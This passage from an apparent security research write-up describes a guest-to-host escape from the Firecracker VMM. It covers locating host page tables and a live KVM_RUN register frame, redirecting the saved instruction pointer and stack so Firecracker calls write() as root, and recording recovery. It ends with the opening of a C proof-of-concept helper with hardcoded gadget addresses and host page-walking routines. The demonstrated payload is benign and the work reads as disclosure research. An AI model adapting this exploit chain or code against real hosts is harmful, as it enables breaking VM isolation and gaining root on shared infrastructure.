runtime_code_address = load_bias + code_address_in_elf The mapper returned the load bias as firecracker_base . With that value and host_pgd , we could locate code in the running process, translate its virtual address to host physical memory, and compare the bytes there with the expected binary. We checked three locations: the write(2) wrapper that would produce our proof, the continuation after the KVM ioctl, and a short xor eax,eax; ret sequence needed to return cleanly. Their purposes become relevant when we construct the return path below. At this point, the guest could inspect the Firecracker image and its private mappings. We still needed the saved registers of the thread currently running our VM. 02-address-resolution-0e47fd8bf102 Figure 2. The nonce identifies the guest page in host memory. Its mapping leads to a host page table root, which lets the next resolver locate and validate the Firecracker image. 03 / Locating the live vCPU frame The frame finder took host_pgd and firecracker_base from the preceding stages. It used them to recognize the host thread's saved state. The most useful clue was the return address. A vCPU thread in KVM_RUN should have a saved instruction pointer at the corresponding ioctl continuation in Firecracker. We could calculate that address from the validated binary and its load bias. We then searched host memory for a pt_regs frame consistent with that call. An address match alone would also pick up stale stack contents, so the candidate had to satisfy several related checks: Saved state What we checked System call The syscall identity and in-progress state matched an active ioctl. Request argument The ioctl request was KVM_RUN . File descriptor The descriptor fell within the helper's expected range. Instruction pointer It matched the validated Firecracker ioctl continuation. Stack pointer It translated through the recovered host PGD. Segment selectors and flags They described a valid return to userspace. Caller return address It fell inside the validated Firecracker text mapping. The stack check tied the frame to the same address space we had recovered from the guest page. The instruction and caller addresses tied it to the Firecracker image. The syscall fields tied it to the operation running the vCPU. The search left one candidate. Its location was stored as frame_hpa , the host physical address of the saved register frame. We passed it, the PGD, and the load bias to the final helper. Before changing memory, the helper repeated the code signature, frame, and stack checks. This ensured that the active stage used the same process state the resolvers had identified. The subsequent execution and recovery checks would establish that the selected frame was live. 03-live-kvm-run-frame-ddb3ad26cf50 Figure 3. The candidate register frame must agree with the KVM ioctl, the recovered process page tables, and the validated Firecracker code. 04 / Redirecting the return from KVM We chose a simple payload: make the Firecracker process write a recognizable string to its own stderr. This would give the host runner an observable result from the process we had taken over. The string was N8V23M2
 , seven characters followed by a newline. It occupies eight bytes and fits in one stack word. The call we wanted Firecracker to execute was: write( 2 , "N8V23M2
" , 8 ); Here 2 is Firecracker's stderr file descriptor. The buffer pointer must refer to the string in Firecracker's address space, so we stored the string on its private userspace stack. We saved three stack words before modifying them. One held the string; the other two held the return addresses for the temporary call sequence. We then changed the saved register frame to supply the wrapper address, its arguments, and a stack pointer for that sequence: RIP = address of Firecracker's write wrapper RDI = 2 RSI = virtual address of the marker on Firecracker's stack RDX = 8 RSP = virtual address of the temporary return sequence Returning from write also needed care. A successful write of eight bytes returns 8 , while a successful KVM_RUN call returns zero . We placed the address of xor eax,eax; ret first in the return sequence. It clears the return value before the second address brings execution back to Firecracker's original ioctl continuation. The resulting control flow was: KVM_RUN returns to userspace -> Firecracker's write wrapper emits the marker -> xor eax,eax; ret sets the return value to zero -> execution resumes at the original ioctl continuation With the stack and saved registers prepared, the guest wrote one byte to its serial port. That operation caused the vCPU thread to return from KVM_RUN . The kernel restored the modified registers, and Firecracker entered the write wrapper with our arguments. The wrapper emitted the marker, the return sequence cleared eax , and the thread rejoined its original execution path. After control returned to the guest, the helper restored all three stack words. 04-reversible-control-flow-10ae6af41746 Figure 4. The saved register frame enters the write wrapper. Two return addresses lead through the return-value adjustment and back into the original Firecracker path. 05 / Checking execution and recovery The host runner captured Firecracker's stderr separately from the guest. The complete output was: N8V23M2 The capture contained exactly eight bytes, including the final newline. Firecracker was still running, guest SSH was responsive, and the helper had restored the three temporary stack words. We checked recovery with a fresh pass that made no memory changes. It was given the same frame address and repeated the register, code, and stack checks after the trigger. The checks passed, and it found no stale marker in the temporary stack location. These observations answered three different questions. The guest log recorded the trigger and restoration. The host capture showed that Firecracker executed the selected operation. The final validation checked the state after execution. Check Recorded result Firecracker stderr One copy of the marker, eight bytes in total Firecracker process PID 2936 , alive after the trigger Guest health SSH responsive; uptime 1615.72 seconds Temporary stack state All three original words restored Executable text and shared libraries Unmodified Host kernel errors after the trigger None observed Validation after restoration The supplied frame address and surrounding invariants passed 05-proof-receipt-6e8ad89bf50c Figure 5. The guest log, Firecracker stderr capture, and final validation record the trigger, host execution, and restored state. 06 / Root execution on the host By the time the marker appeared, the guest had selected the host thread's instruction pointer, function arguments, stack data, and return path. Firecracker executed the call using its own privileges. The target was Firecracker v1.16.1 on x86-64, with host kernel 7.0.0-1011-aws and guest kernel 6.18.44+ . We launched Firecracker directly as root under systemd-run and pinned it with taskset . Consequently, the controlled call executed as root on the host. The existing write wrapper gave us a compact proof of that control. Extending it to other calls would require choosing code and arguments compatible with the process's mappings and syscall policy. The configuration used here had no jailer. Firecracker's production containment includes dropping privileges and restricting the process through namespaces and seccomp. A deployment using those controls requires a separate assessment of the privileges and resources available after compromising its VMM. The address discovery is what lets the exploit follow the running instance. The EPT resolver connects a guest page to host memory; the reverse mapper recovers the host address space; the image mapper locates Firecracker under ASLR; and the frame finder identifies the vCPU's saved state. Adapting the final stage to another build requires validating that binary's code signatures and return path. The guest had used access to host memory to take over the thread running the VM itself. A serial write supplied the trigger, and the next userspace operation belonged to us. Captured resolver values and artifacts The following values come from the preserved execution record. The methods above use symbolic names so that the role of each value is clear; this table connects those names to the recorded addresses. Value Recorded address Where it enters the chain guest_gpa 0x08f03000 The guest physical address of the nonce page, supplied to the first resolver guest_page_hpa 0x165610000 The host address of that page, found by the EPT resolver host_pgd 0x14afc2000 The host page table root recovered by the reverse mapper firecracker_base 0x7298c2400000 The Firecracker load bias recovered by the image mapper frame_hpa 0x13a5bff48 The saved register frame selected for the active stage The records use run ID eventpath-v23-0907self02 and boot ID 2b3cd5ac-2311-427f-a50a-6a79ecb8daa7 . These identifiers connect the resolver records, host capture, and validation after restoration. The earlier memory provider also received host-selected task and canary page frame numbers as independent validation overlays after constructing the memory aperture. Those addresses were not consumed by the EPT resolver, reverse mapper, Firecracker mapper, frame finder, or final marker helper. The release bundle contains the final helper source, JSONL resolver records, host capture, recovery manifest, four preserved read-only resolver binaries with provenance, and SHA-256 manifests. The final helper accepts the PGD, load bias, and frame HPA produced by the resolvers. Its checks cover the run identifier, address ranges, code signatures, saved registers, and stack geometry; its dry-run mode performs validation without writing memory. Proof of Concept # define _GNU_SOURCE # include <errno.h> # include <fcntl.h> # include <inttypes.h> # include <signal.h> # include <stdint.h> # include <stdio.h> # include <stdlib.h> # include <string.h> # include <sys/mman.h> # include <sys/types.h> # include <unistd.h> # define PAGE_SIZE_U64 UINT64_C(4096) # define HUGE_2M_U64 (UINT64_C(1) << 21) # define HUGE_1G_U64 (UINT64_C(1) << 30) # define L4_ALIAS_BASE (UINT64_C(1) << 39) # define FIRST_HPA_GIB UINT64_C(4) # define LAST_HPA_GIB UINT64_C(192) # define MARKER_CONFLICT_HPA_GIB UINT64_C(16) # define MARKER_REMAP_ENTRY UINT64_C(193) # define ADDRESS_MASK_4K UINT64_C(0x000ffffffffff000) # define ADDRESS_MASK_2M UINT64_C(0x000fffffffe00000) # define ADDRESS_MASK_1G UINT64_C(0x000fffffc0000000) # define PTE_PRESENT UINT64_C(0x1) # define PTE_USER UINT64_C(0x4) # define PTE_LARGE UINT64_C(0x80) # define PTE_PROTNONE UINT64_C(0x100) # define IOCTL_RETURN_VADDR UINT64_C(0x26aad2) # define WRITE_VADDR UINT64_C(0x27071e) # define ZERO_EAX_RET_VADDR UINT64_C(0x1b274) # define TEXT_FIRST_VADDR UINT64_C(0x12000) # define TEXT_LAST_VADDR UINT64_C(0x276000) # define KVM_RUN_REQUEST UINT64_C(0xae80) # define SYS_IOCTL UINT64_C(16) # define SYSCALL_AX_IN_PROGRESS UINT64_C(0xffffffffffffffda) # define USER_CS UINT64_C(0x33) # define USER_SS UINT64_C(0x2b) # define PTREG_WORDS UINT64_C(21) # define MARKER_LENGTH UINT64_C(8) # define MARKER_STACK_OFFSET UINT64_C(0x30) # define ROP_STACK_OFFSET UINT64_C(16) # define SERIAL_PORT UINT64_C(0x3f8) static const uint8_t marker_bytes[MARKER_LENGTH] = { 'N' , '8' , 'V' , '2' , '3' , 'M' , '2' , '
' }; static const uint8_t write_prefix[] = { 0x48 , 0x83 , 0xec , 0x10 , 0x49 , 0x89 , 0xf2 , 0x48 , 0x89 , 0xd1 , 0x48 , 0x63 , 0xf7 , 0x6a , 0x00 }; static const uint8_t ioctl_continuation[] = { 0x48 , 0x63 , 0xf8 , 0xe8 , 0xc3 , 0xe1 , 0xff , 0xff , 0x48 , 0x83 , 0xc4 , 0x58 , 0xc3 }; static const uint8_t zero_eax_ret[] = { 0x31 , 0xc0 , 0xc3 }; static void fault_handler ( int signal_number) { _exit( 128 + signal_number); } static int valid_run_id ( const char *value) { size_t length = strlen (value); if (length < 14 || length > 64 || strncmp (value, "eventpath-v23-" , 14 ) != 0 ) { return 0 ; } for ( size_t index = 0 ; index < length; index++) { unsigned char byte = ( unsigned char )value[index]; if (!((byte >= 'a' && byte <= 'z' ) || (byte >= '0' && byte <= '9' ) || byte == '-' )) { return 0 ; } } return 1 ; } static uint64_t parse_address ( const char *text, int page_aligned) { char *end = NULL ; uint64_t value; if (text == NULL || strncmp (text, "0x" , 2 ) != 0 ) { fprintf ( stderr , "hex address required
" ); exit ( 64 ); } errno = 0 ; value = strtoull(text + 2 , &end, 16 ); if (errno != 0 || end == text + 2 || *end != '\0' || value == 0 || (page_aligned && (value & (PAGE_SIZE_U64 - 1 )) != 0 )) { fprintf ( stderr , "invalid address
" ); exit ( 64 ); } return value; } static uint64_t alias_entry_for_hpa_gib ( uint64_t hpa_gib) { return hpa_gib == MARKER_CONFLICT_HPA_GIB ? MARKER_REMAP_ENTRY : hpa_gib; } static uint64_t alias_gpa_for_hpa ( uint64_t hpa) { uint64_t hpa_gib = hpa >> 30 ; if (hpa_gib < FIRST_HPA_GIB || hpa_gib > LAST_HPA_GIB) { fprintf ( stderr , "host physical address outside mapped window
" ); exit ( 70 ); } return L4_ALIAS_BASE | (alias_entry_for_hpa_gib(hpa_gib) << 30 ) | (hpa & (HUGE_1G_U64 - 1 )); } static uint8_t * map_host_page ( int descriptor, uint64_t page_hpa, int prot) { uint8_t *mapping; if ((page_hpa & (PAGE_SIZE_U64 - 1 )) != 0 ) { fprintf ( stderr , "unaligned host page
" ); exit ( 70 ); } mapping = mmap( NULL , PAGE_SIZE_U64, prot, MAP_SHARED, descriptor, ( off_t )alias_gpa_for_hpa(page_hpa)); if (mapping == MAP_FAILED) { perror( "mmap host page" ); exit ( 70 ); } return mapping; } static uint64_t read_u64_hpa ( int descriptor, uint64_t hpa) { uint8_t *mapping; uint64_t value; uint64_t page_hpa = hpa & ~(PAGE_SIZE_U64 - 1 ); uint64_t offset = hpa & (PAGE_SIZE_U64 - 1 ); if (offset > PAGE_SIZE_U64 - sizeof (value)) { fprintf ( stderr , "cross-page host read rejected
" ); exit ( 70 ); } mapping = map_host_page(descriptor, page_hpa, PROT_READ); memcpy (&value, mapping + offset, sizeof (value)); if (munmap(mapping, PAGE_SIZE_U64) != 0 ) { perror( "munmap host read" ); exit ( 70 ); } return value; } static int native_user_entry ( uint64_t value) { return (value & (PTE_PRESENT | PTE_USER)) == (PTE_PRESENT | PTE_USER); } static int native_protnone_leaf ( uint64_t value) { return !(value & PTE_PRESENT) && (value & PTE_PROTNONE) && !(value & PTE_LARGE); } static uint64_t walk_native ( int descriptor, uint64_t pgd_hpa, uint64_t virtual_address) { const unsigned shifts[ 4 ] = { 39 , 30 , 21 , 12 }; uint64_t table = pgd_hpa; for ( unsigned level = 0 ; level < 4 ; level++) { uint64_t index = (virtual_address >> shifts[level]) & UINT64_C( 0x1ff ); uint64_t entry = read_u64_hpa( descriptor, table + index * sizeof ( uint64_t )); if (level == 3 && native_protnone_leaf(entry)) { return ((~entry) & ADDRESS_MASK_4K) + (virtual_address & (PAGE_SIZE_U64 - 1 )); } if (!native_user_entry(entry)) { return UINT64_MAX; } if (level == 1 && (entry & PTE_LARGE)) { return (entry & ADDRESS_MASK_1G) + (virtual_address & (HUGE_1G_U64 - 1 )); } if (level == 2 && (entry & PTE_LARGE)) { return (entry & ADDRESS_MASK_2M) + (virtual_address & (HUGE_2M_U64 - 1 )); } table = entry & ADDRESS_MASK_4K; } return table + (virtual_address & (PAGE_SIZE_U64 - 1 )); } static int read_process_bytes ( int descriptor, uint64_t pgd_hpa, uint64_t virtual_address, uint8_t *output, size_t length) { size_t copied = 0 ; while (copied < length) { uint64_t address = virtual_address + copied; uint64_t hpa = walk_native(descriptor, pgd_hpa, address); uint64_t offset; size_t chunk; uint8_t *mapping; if (hpa == UINT64_MAX) { return 0 ;
